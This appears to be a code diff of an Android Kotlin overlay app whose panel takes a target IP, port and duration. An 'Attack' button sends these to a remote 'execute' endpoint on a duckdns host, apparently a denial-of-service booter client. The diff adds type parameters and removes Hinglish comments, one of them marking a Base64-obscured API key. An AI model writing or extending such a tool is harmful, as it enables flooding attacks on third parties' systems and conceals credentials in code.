@@ -33,7 +33,6 @@ class FloatingService : Service() {
         var etPortRef: EditText? = null
         var btnGetIpRef: Button? = null
 
-        // Jab IP milega toh ye function UI ko update karega
         fun onIpFound(ip: String, port: String) {
             Handler(Looper.getMainLooper()).post {
                 etIpRef?.setText(ip)
@@ -64,14 +63,15 @@ class FloatingService : Service() {
         floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
         windowManager.addView(floatingView, params)
 
-        etIp = floatingView.findViewById(R.id.fEtIp)
-        etPort = floatingView.findViewById(R.id.fEtPort)
-        tvTime = floatingView.findViewById(R.id.fTvTime)
-        tvLog = floatingView.findViewById(R.id.tvLog)
-        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
-        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
+        // YAHAN TYPE SPECIFY KIYA HAI TAAPI ERROR NA AAYE
+        etIp = floatingView.findViewById<EditText>(R.id.fEtIp)
+        etPort = floatingView.findViewById<EditText>(R.id.fEtPort)
+        tvTime = floatingView.findViewById<TextView>(R.id.fTvTime)
+        tvLog = floatingView.findViewById<TextView>(R.id.tvLog)
+        btnAttack = floatingView.findViewById<Button>(R.id.fBtnAttack)
+        btnGetIp = floatingView.findViewById<Button>(R.id.fBtnGetIp)
         val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
-        val seekBar = floatingView.findViewById(R.id.fSeekBar)
+        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
         val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)
 
         etIpRef = etIp
@@ -124,7 +124,6 @@ class FloatingService : Service() {
             btnAttack.isEnabled = false
             tvLog.text = "> ATTACK SENT [${selectedTime}s]"
             
-            // Instant API Call
             fireDirectAttack(ip, port, selectedTime)
         }
     }
@@ -133,7 +132,6 @@ class FloatingService : Service() {
         Thread {
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
-                // Hidden API Key
                 val decryptedApiKey = String(Base64.decode("c3BfbGl2ZV8wNjVhMzE4MDc4ZjNlZmMxOWUwYmU3MjAxMDJlOWE3ZQ==", Base64.DEFAULT))
 
                 val url = URL(apiUrl)
